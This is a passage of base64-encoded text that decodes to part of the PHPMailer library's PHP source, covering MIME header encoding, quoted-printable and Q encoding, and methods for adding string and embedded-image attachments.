Wx0OgogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgKz0gcHJlZ19tYXRjaF9hbGwoJy9bXDAwMC1cMDEwXDAxM1wwMTRcMDE2LVwwMzdcMTc3LVwzNzddLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICAgICAgLy9UaGVyZSBhcmUgbm8gY2hhcnMgdGhhdCBuZWVkIGVuY29kaW5nCiAgICAgICAgaWYgKCRtYXRjaGNvdW50ID09IDApIHsKICAgICAgICAgICAgcmV0dXJuICgkc3RyKTsKICAgICAgICB9CgogICAgICAgICRtYXhsZW4gPSA3NSAtIDcgLSBzdHJsZW4oJHRoaXMtPkNoYXJTZXQpOwogICAgICAgIC8vIFRyeSB0byBzZWxlY3QgdGhlIGVuY29kaW5nIHdoaWNoIHNob3VsZCBwcm9kdWNlIHRoZSBzaG9ydGVzdCBvdXRwdXQKICAgICAgICBpZiAoJG1hdGNoY291bnQgPiBzdHJsZW4oJHN0cikgLyAzKSB7CiAgICAgICAgICAgIC8vIE1vcmUgdGhhbiBhIHRoaXJkIG9mIHRoZSBjb250ZW50IHdpbGwgbmVlZCBlbmNvZGluZywgc28gQiBlbmNvZGluZyB3aWxsIGJlIG1vc3QgZWZmaWNpZW50CiAgICAgICAgICAgICRlbmNvZGluZyA9ICdCJzsKICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWJfc3RybGVuJykgJiYgJHRoaXMtPmhhc011bHRpQnl0ZXMoJHN0cikpIHsKICAgICAgICAgICAgICAgIC8vIFVzZSBhIGN1c3RvbSBmdW5jdGlvbiB3aGljaCBjb3JyZWN0bHkgZW5jb2RlcyBhbmQgd3JhcHMgbG9uZwogICAgICAgICAgICAgICAgLy8gbXVsdGlieXRlIHN0cmluZ3Mgd2l0aG91dCBicmVha2luZyBsaW5lcyB3aXRoaW4gYSBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmJhc2U2NEVuY29kZVdyYXBNQigkc3RyLCAiXG4iKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gYmFzZTY0X2VuY29kZSgkc3RyKTsKICAgICAgICAgICAgICAgICRtYXhsZW4gLT0gJG1heGxlbiAlIDQ7CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IHRyaW0oY2h1bmtfc3BsaXQoJGVuY29kZWQsICRtYXhsZW4sICJcbiIpKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRlbmNvZGluZyA9ICdRJzsKICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+ZW5jb2RlUSgkc3RyLCAkcG9zaXRpb24pOwogICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT53cmFwVGV4dCgkZW5jb2RlZCwgJG1heGxlbiwgdHJ1ZSk7CiAgICAgICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoJz0nIC4gc2VsZjo6Q1JMRiwgIlxuIiwgdHJpbSgkZW5jb2RlZCkpOwogICAgICAgIH0KCiAgICAgICAgJGVuY29kZWQgPSBwcmVnX3JlcGxhY2UoJy9eKC4qKSQvbScsICcgPT8nIC4gJHRoaXMtPkNoYXJTZXQgLiAiPyRlbmNvZGluZz9cXDE/PSIsICRlbmNvZGVkKTsKICAgICAgICAkZW5jb2RlZCA9IHRyaW0oc3RyX3JlcGxhY2UoIlxuIiwgJHRoaXMtPkxFLCAkZW5jb2RlZCkpOwoKICAgICAgICByZXR1cm4gJGVuY29kZWQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhIHN0cmluZyBjb250YWlucyBtdWx0aS1ieXRlIGNoYXJhY3RlcnMuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIG11bHRpLWJ5dGUgdGV4dCB0byB3cmFwIGVuY29kZQogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBoYXNNdWx0aUJ5dGVzKCRzdHIpCiAgICB7CiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWJfc3RybGVuJykpIHsKICAgICAgICAgICAgcmV0dXJuIChzdHJsZW4oJHN0cikgPiBtYl9zdHJsZW4oJHN0ciwgJHRoaXMtPkNoYXJTZXQpKTsKICAgICAgICB9IGVsc2UgeyAvLyBBc3N1bWUgbm8gbXVsdGlieXRlcyAod2UgY2FuJ3QgaGFuZGxlIHdpdGhvdXQgbWJzdHJpbmcgZnVuY3Rpb25zIGFueXdheSkKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIERvZXMgYSBzdHJpbmcgY29udGFpbiBhbnkgOC1iaXQgY2hhcnMgKGluIGFueSBjaGFyc2V0KT8KICAgICAqIEBwYXJhbSBzdHJpbmcgJHRleHQKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaGFzOGJpdENoYXJzKCR0ZXh0KQogICAgewogICAgICAgIHJldHVybiAoYm9vbGVhbilwcmVnX21hdGNoKCcvW1x4ODAtXHhGRl0vJywgJHRleHQpOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGFuZCB3cmFwIGxvbmcgbXVsdGlieXRlIHN0cmluZ3MgZm9yIG1haWwgaGVhZGVycwogICAgICogd2l0aG91dCBicmVha2luZyBsaW5lcyB3aXRoaW4gYSBjaGFyYWN0ZXIuCiAgICAgKiBBZGFwdGVkIGZyb20gYSBmdW5jdGlvbiBieSBwYXJhdm9pZAogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5tYi1lbmNvZGUtbWltZWhlYWRlci5waHAjNjAyODMKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgbXVsdGktYnl0ZSB0ZXh0IHRvIHdyYXAgZW5jb2RlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRsaW5lYnJlYWsgc3RyaW5nIHRvIHVzZSBhcyBsaW5lZmVlZC9lbmQtb2YtbGluZQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGJhc2U2NEVuY29kZVdyYXBNQigkc3RyLCAkbGluZWJyZWFrID0gbnVsbCkKICAgIHsKICAgICAgICAkc3RhcnQgPSAnPT8nIC4gJHRoaXMtPkNoYXJTZXQgLiAnP0I/JzsKICAgICAgICAkZW5kID0gJz89JzsKICAgICAgICAkZW5jb2RlZCA9ICcnOwogICAgICAgIGlmICgkbGluZWJyZWFrID09PSBudWxsKSB7CiAgICAgICAgICAgICRsaW5lYnJlYWsgPSAkdGhpcy0+TEU7CiAgICAgICAgfQoKICAgICAgICAkbWJfbGVuZ3RoID0gbWJfc3RybGVuKCRzdHIsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAvLyBFYWNoIGxpbmUgbXVzdCBoYXZlIGxlbmd0aCA8PSA3NSwgaW5jbHVkaW5nICRzdGFydCBhbmQgJGVuZAogICAgICAgICRsZW5ndGggPSA3NSAtIHN0cmxlbigkc3RhcnQpIC0gc3RybGVuKCRlbmQpOwogICAgICAgIC8vIEF2ZXJhZ2UgbXVsdGktYnl0ZSByYXRpbwogICAgICAgICRyYXRpbyA9ICRtYl9sZW5ndGggLyBzdHJsZW4oJHN0cik7CiAgICAgICAgLy8gQmFzZTY0IGhhcyBhIDQ6MyByYXRpbwogICAgICAgICRhdmdMZW5ndGggPSBmbG9vcigkbGVuZ3RoICogJHJhdGlvICogLjc1KTsKCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJG1iX2xlbmd0aDsgJGkgKz0gJG9mZnNldCkgewogICAgICAgICAgICAkbG9va0JhY2sgPSAwOwogICAgICAgICAgICBkbyB7CiAgICAgICAgICAgICAgICAkb2Zmc2V0ID0gJGF2Z0xlbmd0aCAtICRsb29rQmFjazsKICAgICAgICAgICAgICAgICRjaHVuayA9IG1iX3N1YnN0cigkc3RyLCAkaSwgJG9mZnNldCwgJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgJGNodW5rID0gYmFzZTY0X2VuY29kZSgkY2h1bmspOwogICAgICAgICAgICAgICAgJGxvb2tCYWNrKys7CiAgICAgICAgICAgIH0gd2hpbGUgKHN0cmxlbigkY2h1bmspID4gJGxlbmd0aCk7CiAgICAgICAgICAgICRlbmNvZGVkIC49ICRjaHVuayAuICRsaW5lYnJlYWs7CiAgICAgICAgfQoKICAgICAgICAvLyBDaG9tcCB0aGUgbGFzdCBsaW5lZmVlZAogICAgICAgICRlbmNvZGVkID0gc3Vic3RyKCRlbmNvZGVkLCAwLCAtc3RybGVuKCRsaW5lYnJlYWspKTsKICAgICAgICByZXR1cm4gJGVuY29kZWQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBzdHJpbmcgaW4gcXVvdGVkLXByaW50YWJsZSBmb3JtYXQuCiAgICAgKiBBY2NvcmRpbmcgdG8gUkZDMjA0NSBzZWN0aW9uIDYuNy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgVGhlIHRleHQgdG8gZW5jb2RlCiAgICAgKiBAcGFyYW0gaW50ZWdlciAkbGluZV9tYXggTnVtYmVyIG9mIGNoYXJzIGFsbG93ZWQgb24gYSBsaW5lIGJlZm9yZSB3cmFwcGluZwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqIEBsaW5rIGh0dHA6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ucXVvdGVkLXByaW50YWJsZS1kZWNvZGUucGhwIzg5NDE3IEFkYXB0ZWQgZnJvbSB0aGlzIGNvbW1lbnQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVFQKCRzdHJpbmcsICRsaW5lX21heCA9IDc2KQogICAgewogICAgICAgIC8vIFVzZSBuYXRpdmUgZnVuY3Rpb24gaWYgaXQncyBhdmFpbGFibGUgKD49IFBIUDUuMykKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdxdW90ZWRfcHJpbnRhYmxlX2VuY29kZScpKSB7CiAgICAgICAgICAgIHJldHVybiBxdW90ZWRfcHJpbnRhYmxlX2VuY29kZSgkc3RyaW5nKTsKICAgICAgICB9CiAgICAgICAgLy8gRmFsbCBiYWNrIHRvIGEgcHVyZSBQSFAgaW1wbGVtZW50YXRpb24KICAgICAgICAkc3RyaW5nID0gc3RyX3JlcGxhY2UoCiAgICAgICAgICAgIGFycmF5KCclMjAnLCAnJTBEJTBBLicsICclMEQlMEEnLCAnJScpLAogICAgICAgICAgICBhcnJheSgnICcsICJcclxuPTJFIiwgIlxyXG4iLCAnPScpLAogICAgICAgICAgICByYXd1cmxlbmNvZGUoJHN0cmluZykKICAgICAgICApOwogICAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy9bXlxyXG5deycgLiAoJGxpbmVfbWF4IC0gMykgLiAnfVtePVxyXG5dezJ9LycsICIkMD1cclxuIiwgJHN0cmluZyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBCYWNrd2FyZCBjb21wYXRpYmlsaXR5IHdyYXBwZXIgZm9yIGFuIG9sZCBRUCBlbmNvZGluZyBmdW5jdGlvbiB0aGF0IHdhcyByZW1vdmVkLgogICAgICogQHNlZSBQSFBNYWlsZXI6OmVuY29kZVFQKCkKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcKICAgICAqIEBwYXJhbSBpbnRlZ2VyICRsaW5lX21heAogICAgICogQHBhcmFtIGJvb2xlYW4gJHNwYWNlX2NvbnYKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKiBAZGVwcmVjYXRlZCBVc2UgZW5jb2RlUVAgaW5zdGVhZC4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVFQcGhwKAogICAgICAgICRzdHJpbmcsCiAgICAgICAgJGxpbmVfbWF4ID0gNzYsCiAgICAgICAgLyoqIEBub2luc3BlY3Rpb24gUGhwVW51c2VkUGFyYW1ldGVySW5zcGVjdGlvbiAqLyAkc3BhY2VfY29udiA9IGZhbHNlCiAgICApIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmVuY29kZVFQKCRzdHJpbmcsICRsaW5lX21heCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBzdHJpbmcgdXNpbmcgUSBlbmNvZGluZy4KICAgICAqIEBsaW5rIGh0dHA6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzIwNDcKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciB0aGUgdGV4dCB0byBlbmNvZGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBvc2l0aW9uIFdoZXJlIHRoZSB0ZXh0IGlzIGdvaW5nIHRvIGJlIHVzZWQsIHNlZSB0aGUgUkZDIGZvciB3aGF0IHRoYXQgbWVhbnMKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlUSgkc3RyLCAkcG9zaXRpb24gPSAndGV4dCcpCiAgICB7CiAgICAgICAgLy8gVGhlcmUgc2hvdWxkIG5vdCBiZSBhbnkgRU9MIGluIHRoZSBzdHJpbmcKICAgICAgICAkcGF0dGVybiA9ICcnOwogICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoYXJyYXkoIlxyIiwgIlxuIiksICcnLCAkc3RyKTsKICAgICAgICBzd2l0Y2ggKHN0cnRvbG93ZXIoJHBvc2l0aW9uKSkgewogICAgICAgICAgICBjYXNlICdwaHJhc2UnOgogICAgICAgICAgICAgICAgLy8gUkZDIDIwNDcgc2VjdGlvbiA1LjMKICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ15BLVphLXowLTkhKitcLyAtJzsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAvKiogQG5vaW5zcGVjdGlvbiBQaHBNaXNzaW5nQnJlYWtTdGF0ZW1lbnRJbnNwZWN0aW9uICovCiAgICAgICAgICAgIGNhc2UgJ2NvbW1lbnQnOgogICAgICAgICAgICAgICAgLy8gUkZDIDIwNDcgc2VjdGlvbiA1LjIKICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ1woXCkiJzsKICAgICAgICAgICAgICAgIC8vIGludGVudGlvbmFsIGZhbGwtdGhyb3VnaAogICAgICAgICAgICAgICAgLy8gZm9yIHRoaXMgcmVhc29uIHdlIGJ1aWxkIHRoZSAkcGF0dGVybiB3aXRob3V0IGluY2x1ZGluZyBkZWxpbWl0ZXJzIGFuZCBbXQogICAgICAgICAgICBjYXNlICd0ZXh0JzoKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIC8vIFJGQyAyMDQ3IHNlY3Rpb24gNS4xCiAgICAgICAgICAgICAgICAvLyBSZXBsYWNlIGV2ZXJ5IGhpZ2ggYXNjaWksIGNvbnRyb2wsID0sID8gYW5kIF8gY2hhcmFjdGVycwogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXDAwMC1cMDExXDAxM1wwMTRcMDE2LVwwMzdcMDc1XDA3N1wxMzdcMTc3LVwzNzcnIC4gJHBhdHRlcm47CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgJG1hdGNoZXMgPSBhcnJheSgpOwogICAgICAgIGlmIChwcmVnX21hdGNoX2FsbCgiL1t7JHBhdHRlcm59XS8iLCAkZW5jb2RlZCwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgIC8vIElmIHRoZSBzdHJpbmcgY29udGFpbnMgYW4gJz0nLCBtYWtlIHN1cmUgaXQncyB0aGUgZmlyc3QgdGhpbmcgd2UgcmVwbGFjZQogICAgICAgICAgICAvLyBzbyBhcyB0byBhdm9pZCBkb3VibGUtZW5jb2RpbmcKICAgICAgICAgICAgJGVxa2V5ID0gYXJyYXlfc2VhcmNoKCc9JywgJG1hdGNoZXNbMF0pOwogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlcWtleSkgewogICAgICAgICAgICAgICAgdW5zZXQoJG1hdGNoZXNbMF1bJGVxa2V5XSk7CiAgICAgICAgICAgICAgICBhcnJheV91bnNoaWZ0KCRtYXRjaGVzWzBdLCAnPScpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5X3VuaXF1ZSgkbWF0Y2hlc1swXSkgYXMgJGNoYXIpIHsKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoJGNoYXIsICc9JyAuIHNwcmludGYoJyUwMlgnLCBvcmQoJGNoYXIpKSwgJGVuY29kZWQpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIC8vIFJlcGxhY2UgZXZlcnkgc3BhY2VzIHRvIF8gKG1vcmUgcmVhZGFibGUgdGhhbiA9MjApCiAgICAgICAgcmV0dXJuIHN0cl9yZXBsYWNlKCcgJywgJ18nLCAkZW5jb2RlZCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSBzdHJpbmcgb3IgYmluYXJ5IGF0dGFjaG1lbnQgKG5vbi1maWxlc3lzdGVtKS4KICAgICAqIFRoaXMgbWV0aG9kIGNhbiBiZSB1c2VkIHRvIGF0dGFjaCBhc2NpaSBvciBiaW5hcnkgZGF0YSwKICAgICAqIHN1Y2ggYXMgYSBCTE9CIHJlY29yZCBmcm9tIGEgZGF0YWJhc2UuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgU3RyaW5nIGF0dGFjaG1lbnQgZGF0YS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lIE5hbWUgb2YgdGhlIGF0dGFjaG1lbnQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBGaWxlIGVuY29kaW5nIChzZWUgJEVuY29kaW5nKS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgRmlsZSBleHRlbnNpb24gKE1JTUUpIHR5cGUuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbiBEaXNwb3NpdGlvbiB0byB1c2UKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkU3RyaW5nQXR0YWNobWVudCgKICAgICAgICAkc3RyaW5nLAogICAgICAgICRmaWxlbmFtZSwKICAgICAgICAkZW5jb2RpbmcgPSAnYmFzZTY0JywKICAgICAgICAkdHlwZSA9ICcnLAogICAgICAgICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JwogICAgKSB7CiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgIGlmICgkdHlwZSA9PSAnJykgewogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRmaWxlbmFtZSk7CiAgICAgICAgfQogICAgICAgIC8vIEFwcGVuZCB0byAkYXR0YWNobWVudCBhcnJheQogICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgKICAgICAgICAgICAgMCA9PiAkc3RyaW5nLAogICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgMiA9PiBiYXNlbmFtZSgkZmlsZW5hbWUpLAogICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgNSA9PiB0cnVlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgIDcgPT4gMAogICAgICAgICk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gZW1iZWRkZWQgKGlubGluZSkgYXR0YWNobWVudCBmcm9tIGEgZmlsZS4KICAgICAqIFRoaXMgY2FuIGluY2x1ZGUgaW1hZ2VzLCBzb3VuZHMsIGFuZCBqdXN0IGFib3V0IGFueSBvdGhlciBkb2N1bWVudCB0eXBlLgogICAgICogVGhlc2UgZGlmZmVyIGZyb20gJ3JlZ3VsYXInIGF0dGFjaG1lbnRzIGluIHRoYXQgdGhleSBhcmUgaW50ZW5kZWQgdG8gYmUKICAgICAqIGRpc3BsYXllZCBpbmxpbmUgd2l0aCB0aGUgbWVzc2FnZSwgbm90IGp1c3QgYXR0YWNoZWQgZm9yIGRvd25sb2FkLgogICAgICogVGhpcyBpcyB1c2VkIGluIEhUTUwgbWVzc2FnZXMgdGhhdCBlbWJlZCB0aGUgaW1hZ2VzCiAgICAgKiB0aGUgSFRNTCByZWZlcnMgdG8gdXNpbmcgdGhlICRjaWQgdmFsdWUuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIFBhdGggdG8gdGhlIGF0dGFjaG1lbnQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjaWQgQ29udGVudCBJRCBvZiB0aGUgYXR0YWNobWVudDsgVXNlIHRoaXMgdG8gcmVmZXJlbmNlCiAgICAgKiAgICAgICAgdGhlIGNvbnRlbnQgd2hlbiB1c2luZyBhbiBlbWJlZGRlZCBpbWFnZSBpbiBIVE1MLgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgbmFtZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLgogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIE1JTUUgdHlwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICogQHJldHVybiBib29sZWFuIFRydWUgb24gc3VjY2Vzc2Z1bGx5IGFkZGluZyBhbiBhdHRhY2htZW50CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRFbWJlZGRlZEltYWdlKCRwYXRoLCAkY2lkLCAkbmFtZSA9ICcnLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2lubGluZScpCiAgICB7CiAgICAgICAgaWYgKCFAaXNfZmlsZSgkcGF0aCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICAvLyBJZiBhIE1JTUUgdHlwZSBpcyBub3Qgc3BlY2lmaWVkLCB0cnkgdG8gd29yayBpdCBvdXQgZnJvbSB0aGUgZmlsZSBuYW1lCiAgICAgICAgaWYgKCR0eXBlID09ICcnKSB7CiAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJHBhdGgpOwogICAgICAgIH0KCiAgICAgICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHBhdGgpOwogICAgICAgIGlmICgkbmFtZSA9PSAnJykgewogICAgICAgICAgICAkbmFtZSA9ICRmaWxlbmFtZTsKICAgICAgICB9CgogICAgICAgIC8vIEFwcGVuZCB0byAkYXR0YWNobWVudCBhcnJheQogICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgKICAgICAgICAgICAgMCA9PiAkcGF0aCwKICAgICAgICAgICAgMSA9PiAkZmlsZW5hbWUsCiAgICAgICAgICAgIDIgPT4gJG5hbWUsCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLAogICAgICAgICAgICA0ID0+ICR0eXBlLAogICAgICAgICAgICA1ID0+IGZhbHNlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgIDcgPT4gJGNpZAogICAgICAgICk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gZW1iZWRkZWQgc3RyaW5naWZpZWQgYXR0YWNobWVudC4KICAgICAqIFRoaXMgY2FuIGluY2x1ZGUgaW1hZ2VzLCBzb3VuZHMsIGFuZCBqdXN0IGFib3V0IGFueSBvdGhlciBkb2N1bWVudCB0eXBlLgogICAgICogQmUgc3VyZSB0byBzZXQgdGhlICR0eXBlIHRvIGFuIGltYWdlIHR5cGUgZm9yIGltYWdlczoKICAgICAqIEpQRUcgaW1hZ2VzIHVzZSAnaW1hZ2UvanBlZycsIEdJRiB1c2VzICdpbWFnZS9naWYnLCBQTkcgdXNlcyAnaW1hZ2UvcG5nJy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyBUaGUgYXR0YWNobWVudCBiaW5hcnkgZGF0YS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGNpZCBDb250ZW50IElEIG9mIHRoZSBhdHRhY2htZW50OyBVc2UgdGhpcyB0byByZWZlcmVuY2UKICAgICAqICAgICAgICB0aGUgY29udGVudCB3aGVuIHVzaW5nIGFuIGVtYmVkZGVkIGltYWdlIGluIEhUTUwuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBGaWxlIGVuY29kaW5nIChzZWUgJEVuY29kaW5nKS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgTUlNRSB0eXBlLgogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gVHJ1ZSBvbiBzdWNjZXNzZnVsbHkgYWRkaW5nIGFuIGF0dGFjaG1lbnQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZFN0cmluZ0VtYmVkZGVkSW1hZ2UoCiAgICAgICAgJHN0cmluZywKICAgICAgICAkY2lkLAogICAgICAgICRuYW1lID0gJycsCiAgICAgICAgJGVuY29kaW5nID0gJ2Jhc2U2NCcsCiAgICAgICAgJHR5cGUgPSAnJywKICAgICAgICAkZGlzcG9zaXRpb24gPSAnaW5saW5lJwogICAgKSB7CiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIG5hbWUKICAgICAgICBpZiAoJHR5cGUgPT0gJycgYW5kICFlbXB0eSgkbmFtZSkpIHsKICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkbmFtZSk7CiAgICAgICAgfQoKICAgICAgICAvLyBBcHBlbmQgdG8gJGF0dGFjaG1lbnQgYXJyYXkKICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoCiAgICAgICAgICAgIDAgPT4gJHN0cmluZywKICAgICAgICAgICAgMSA9PiAkbmFtZSwKICAgICAgICAgICAgMiA9PiAkbmFtZSwKICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsCiAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgIDUgPT4gdHJ1ZSwgLy8gaXNTdHJpbmdBdHRhY2htZW50CiAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICA3ID0+ICRjaWQKICAgICAgICApOwogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgaWYgYW4gaW5saW5lIGF0dGFjaG1lbnQgaXMgcHJlc2VudC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlubGluZUltYWdlRXhpc3RzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgewogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJ2lubGluZScpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIGFuIGF0dGFjaG1lbnQgKG5vbi1pbmxpbmUpIGlzIHByZXNlbnQuCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGF0dGFjaG1lbnRFeGlzdHMoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7CiAgICAgICAgICAgIGlmICgkYXR0YWNobWVudFs2XSA9PSAnYXR0YWNobWVudCcpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIHRoaXMgbWVzc2FnZSBoYXMgYW4g